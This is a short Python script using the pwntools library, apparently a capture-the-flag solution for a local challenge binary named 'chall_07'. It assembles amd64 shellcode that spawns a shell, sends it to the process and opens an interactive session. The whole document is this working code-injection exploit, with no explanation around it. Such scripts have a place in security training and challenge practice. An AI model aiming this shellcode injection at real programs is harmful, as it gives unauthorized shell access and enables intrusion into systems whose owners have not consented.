from pwn import *
p=process("./chall_07")
context.arch="amd64"
a=asm(shellcraft.sh())
p.sendline(a)
p.interactive()
